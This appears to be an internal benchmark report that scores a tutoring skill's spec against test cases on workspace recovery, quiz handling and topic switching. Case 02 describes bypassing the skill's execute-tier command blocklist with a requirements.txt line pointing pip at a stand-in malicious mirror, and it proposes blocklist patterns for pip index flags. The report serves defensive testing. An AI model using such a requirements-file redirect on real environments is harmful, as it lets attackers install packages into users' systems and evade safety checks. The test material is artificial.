# Round 42b Benchmark Report — Disciplined Methodology Arm

**Date:** 2026-06-18
**Commit under test:** `668371f` (dev/v0.4-convergence-loop, same as Agent A)
**Branch:** `dev/v0.4-convergence-loop`
**Round type:** Rubric-disciplined fresh gate — R42 Agent B arm
**Author:** R42 Agent B (disciplined methodology)
**Convergence counter going in:** 0/3

---

## Methodology applied

This arm applies a two-stage filter to eliminate the noise sources that may have inflated FAIL rates in R30-R41:

1. **R1-R3 realism filter** (pre-authoring): reject cases that are pathologically adversarial, already handled by LLM defaults, or without real user consequence.
2. **PR1+PR2 rubric** (scoring): PASS requires both behavioral correctness AND spec-grounded path. PASS-WITH-GAP is a separate bucket for cases where the LLM gets it right but the spec is implicit.

---

## Section A — Candidate surface brainstorm and realism filter

8 surfaces considered:

| # | Surface | R1 | R2 | R3 | Decision |
|---|---|---|---|---|---|
| 1 | GitHub URL + "教我" intent conflict | PASS | REJECT | — | R2 FAIL: spec explicitly maps repo entry to heavy mode; no gap to test |
| 2 | User manually renames `.deeptutor/<slug>/` directory | PASS | PASS | PASS | KEEP |
| 3 | execute_tier blocklist bypass via `--index-url` inside `requirements.txt` | PASS | PASS | PASS | KEEP |
| 4 | Partial pip install failure (exit code 1, non-timeout) | PASS | PASS | PASS | KEEP |
| 5 | User sends "忘了我" immediately after a quiz question (mid-quiz override guard) | PASS | PASS | PASS | KEEP |
| 6 | `manifest.yaml` has local-timezone offset instead of UTC Z | PASS | PASS | REJECT | R3 FAIL: timezone format in `updated_at` has no operational consequence; skill does not parse timestamps for logic |
| 7 | `quizzes.md` manually broken; user asks recovery | PASS | REJECT | — | R2 FAIL: spec has explicit handler at light-mode.md §2.d (archive + recovery trigger phrase) |
| 8 | NL topic-switch detection with multiple sibling workspaces | PASS | PASS | PASS | KEEP |

**3 rejected:** Surface 1 (R2), Surface 6 (R3), Surface 7 (R2).
**5 survivors:** Surfaces 2, 3, 4, 5, 8.

---

## Section B — Fresh case results

### Case 01 — Workspace directory manually renamed (R42b-fresh-workspace-rename-01)

**Surface:** Session resume integrity — user renamed `.deeptutor/transformer-self-attention/` to `.deeptutor/my-attn-notes/`.

**PR1:** The spec's orphan workspace scan detects `.deeptutor/my-attn-notes/manifest.yaml` with `topic: transformer-self-attention` and presents a 3-option disambiguation. No silent recreation. User's 10-turn history and 12 quiz entries preserved.

**PR2:** `input-detection.md §Orphan workspace scan` has exact wording covering this case.

**Verdict: PASS**

---

### Case 02 — execute_tier blocklist bypass via requirements.txt `--index-url` (R42b-fresh-execute-blocklist-indirect-02)

**Surface:** execute-tier safety — `pip install -r requirements.txt` where `requirements.txt` contains `--index-url https://malicious-mirror.example.com/simple/`.

**PR1:** The blocklist scan (execute-tier.md §Step 3) operates only on lines of `setup_notes.md §Proposed setup commands`. The command `pip install -r requirements.txt` passes the scan; the contents of `requirements.txt` are never read by the scanner. The malicious `--index-url` executes. **PR1 FAIL** — user's virtualenv is populated from an attacker-controlled mirror: security breach.

**PR2:** No blocklist pattern covers `--index-url` inside a referenced requirements file. The pre-processing rule covers shell variable substitution, not file dereferencing. P7 cannot fire for an unnamed invariant. **PR2 FAIL.**

**Severity: CRITICAL** — supply-chain security breach; packages from attacker-controlled index installed into user's environment.

**Verdict: FAIL — CRITICAL**

**Fix direction:**
1. execute-tier.md §Step 2: when `requirements.txt` is referenced, inline all non-standard flags (lines starting with `--`) into a `## Requirements flags detected` subsection of `setup_notes.md`.
2. execute-tier.md §Step 3 blocklist: if install command is `pip install -r <file>`, read and scan each line of `<file>` for blocklist patterns. Add: `--index-url`, `--extra-index-url`, `--trusted-host`, `--find-links <non-localhost-URL>`.

---

### Case 03 — Partial pip install failure, exit code 1 (R42b-fresh-execute-partial-install-03)

**Surface:** execute-tier recovery — pip exits with code 1 after `torch` installed but `transformers` package not found.

**PR1:** "Any failed step → stop, write findings, never retry" (execute-tier.md safety gates). A 🐛 finding is written citing `sources/code/_runs/install_<ts>.log`. Install stops safely. No unsafe retry. User sees the failure. **PR1 PASS** — user-acceptable outcome; partial install visible in log.

**PR2:** Safety gates table + workspace-spec.md "cited by 🐛 setup/smoke failure findings" note together ground writing a 🐛 finding + log + stop. **PR2 PASS** (implicit — no exact template for exit-code-1 case, only for timeout case).

**Gap (MINOR):** No finding text template for the exit-code-1 (non-timeout) failure. Timeout case has exact template; general failure does not. Implementer may omit log path or failing package name from the finding.

**Verdict: PASS-WITH-GAP**

---

### Case 04 — "忘了我" immediately after quiz question (R42b-fresh-mid-quiz-override-04)

**Surface:** Mid-quiz override guard — user resets workspace with "忘了我" without answering the pending quiz.

**PR1:** Mid-quiz guard fires (previous action = `d`, no quiz answer in current turn). Coordinator annotates `Q-a4f2c8` History with `[skipped: user override on turn N+1 before answer received]` before executing the archive. Workspace archived; fresh workspace created. No incorrect "never asked" priority in future session (new session has empty quizzes). **PR1 PASS.**

**PR2:** SKILL.md §User overrides (priority 1 + mid-quiz guard) + workspace-spec.md §quizzes.md §Mode-switch mid-quiz collectively ground every step. **PR2 PASS.**

**Advisory (LOW):** For priority-1 "忘了我" overrides, the annotation is functionally vacuous (file archived immediately). Spec could note this is audit-trail-only for archive cases. No behavioral fix required.

**Verdict: PASS**

---

### Case 05 — NL topic-switch detection with multiple sibling workspaces (R42b-fresh-nl-topic-switch-multiworkspace-05)

**Surface:** NL topic-switch condition (c) — "BERT 用同样的 √d_k 缩放吗？" during transformer-self-attention session; `bert-pretraining/findings.md` exists as sibling workspace.

**PR1:** Condition (b): "√d_k" is in an unchecked node title of current `learning_path.md` → condition (b) = FALSE → legitimate follow-up, stay in current workspace. Condition (c): message is a paraphrase of `I-a3f2c1` in ACTIVE workspace's `findings.md` → condition (c) = FALSE → independent confirmation. Sibling `bert-pretraining/findings.md` correctly excluded by the "only active workspace's `findings.md` matters" rule. Disambiguation prompt does NOT fire. **PR1 PASS.**

**PR2:** SKILL.md §NL topic-switch detection defines conditions (a), (b), (c) with this verbatim example and the explicit "only active workspace" qualifier. **PR2 PASS.**

**Verdict: PASS**

---

## Section C — Fresh case score summary

| Case | Surface | Verdict | Severity |
|---|---|---|---|
| R42b-01 | Workspace directory renamed | PASS | — |
| R42b-02 | execute_tier blocklist bypass via requirements.txt | FAIL | CRITICAL |
| R42b-03 | Partial pip install failure (exit code 1) | PASS-WITH-GAP | MINOR gap only |
| R42b-04 | "忘了我" immediately after quiz (mid-quiz guard) | PASS | — |
| R42b-05 | NL topic-switch, multiple sibling workspaces | PASS | — |

**PASS: 3 / PASS-WITH-GAP: 1 / FAIL: 1 (CRITICAL) / UNCLEAR: 0**

---

## Section D — Spot regression (prior rounds, new rubric applied)

### Regression 1 — R35-fresh-human-03: Meta-question handling

**Original verdict (R35):** FAIL — no meta-question handler in light-mode action priority list.

**New rubric application:**

**PR1:** Current spec has `a0. Meta-question handler` at the top of light-mode.md §2 priority list (exact example "你刚才的回答是怎么生成的" / "为什么先 Socratic 再 Quiz" is listed). The coordinator answers the meta-question in 1 paragraph, cites the relevant reference file, asks "继续学？". **PR1 PASS** — fix was applied.

**PR2:** `light-mode.md §2.a0` is explicit. **PR2 PASS.**

**Re-verdict: PASS (fix holding)**

---

### Regression 2 — R39-fresh-seam-02: User-retitled finding causes incremental dedup to produce duplicate entry

**Original verdict (R39):** FAIL — user-retitled findings keep old ID; next incremental call re-derives new ID from new title and generates duplicate entry.

**New rubric application:**

**PR1:** Current spec has `deep-research SKILL.md §incremental mode §User-retitled finding dedup guard`: "before writing any new finding, scan existing `findings.md` entries for an HTML comment `<!-- title-edited: id frozen; ... -->`. For those entries, match by stable ID only — do NOT re-derive a new hash from the current title." This guards against the incremental-duplicate scenario. **PR1 PASS** — the fix prevents duplicate insertion.

**PR2:** The rule is explicit in deep-research SKILL.md §incremental mode (line 217). **PR2 PASS.**

**BUT NOTE:** The fix requires the user to have added an HTML comment `<!-- title-edited: id frozen; ... -->` when they edited the title, OR for a prior reconciliation step to have added it. The spec's user-edit reconciliation rule (heavy-mode.md §Phase 1 Step 1) says "user changes are authoritative" but does NOT say "add an HTML comment when a user edits a title." Without the comment, the dedup guard never fires.

**Realism filter re-check (R2):** Would a typical user add an HTML comment when manually editing a finding title? Almost certainly not — this is a developer-centric annotation pattern. Without the comment, the guard fails silently.

**Gap (MINOR):** The dedup guard requires a magic HTML comment that the spec never instructs anyone to write. The fix is structurally incomplete: it closes the case where the comment exists but not the common case where the user just edits the title without adding the comment.

**Re-verdict: PASS-WITH-GAP (fix partially holding; gap in comment-insertion rule)**

---

## Section E — Full score summary

| Category | PASS | PASS-WITH-GAP | FAIL | UNCLEAR |
|---|---|---|---|---|
| Fresh cases (5) | 3 | 1 | 1 CRITICAL | 0 |
| Spot regression (2) | 1 | 1 | 0 | 0 |
| **Total (7)** | **4** | **2** | **1 CRITICAL** | **0** |

**Fresh gate: PASS + PASS-WITH-GAP = 4/5. Threshold = 4/5. THRESHOLD MET.**
**BUT: 1 CRITICAL FAIL → gate FAILS regardless.**

---

## Section F — Verdict

### Gate status

**PASS+PASS-WITH-GAP = 4/5 (80%). Threshold met.**
**CRITICAL FAIL present (Case 02 — blocklist bypass). Gate FAILS.**

Per verdict logic: "If any CRITICAL fail → gate fails regardless."

**Counter STAYS at 0/3.**

---

## Section G — Did the rubric change the picture?

**Yes — materially.**

Under the old subjective methodology, R30-R41 scored approximately 50% fresh pass rate. Under this rubric:
- 3 surfaces were filtered out at the realism stage (Surface 1: spec handles it; Surface 6: no real consequence; Surface 7: spec has explicit handler). These would likely have been scored as FAILs under the old letter-matching methodology.
- Of the 5 surviving cases, 4 scored PASS or PASS-WITH-GAP.
- The 1 FAIL is genuine and severe (CRITICAL — security breach), not a letter-matching or doc-gap finding.

**The rubric confirms the hypothesis partially:** many prior FAILs were likely R2 rejections (testing LLM/spec behavior that was already covered) or R3 rejections (no real consequence). The 80% threshold was achievable on these 5 cases.

**However**, the gate still fails because Case 02 is a genuine security gap in the execute-tier blocklist — not a methodology artifact. The blocklist bypass via `requirements.txt` is a CRITICAL real-world vulnerability that the spec genuinely does not address. This is the type of finding the benchmark should surface.

**Net assessment:** The disciplined methodology produces fewer false FAILs (cleaner signal) while still surfacing the genuine CRITICAL gap. Recommended action: apply the two-part Case 02 fix to execute-tier.md, then re-gate. With that fix applied, the expected score would be 5/5 PASS (4 PASS + 1 PASS-WITH-GAP on Case 03), which would advance the counter.

---

## Section H — FAIL backlog items

| Case | Severity | Fix location | Fix description |
|---|---|---|---|
| R42b-02 (blocklist bypass) | CRITICAL | execute-tier.md §Step 2 + §Step 3 | Inline `requirements.txt` flags into setup_notes.md; extend blocklist scan to read referenced requirements files and block `--index-url` / `--extra-index-url` etc. |
| R42b-03 (partial install finding template) | MINOR | execute-tier.md §Step 3 | Add finding text template for exit-code-1 (non-timeout) pip failures analogous to the existing timeout template |
| R39-seam-02 regression (dedup guard incomplete) | MINOR | heavy-mode.md §Phase 1 Step 1 (user-edit reconciliation) | When reconciliation accepts a user title edit, automatically append `<!-- title-edited: id frozen; original-hash: <old-hash> -->` to the entry line so the incremental dedup guard fires correctly |

---

*Report generated by R42 Agent B — disciplined methodology arm (commit `668371f`, 2026-06-18).*
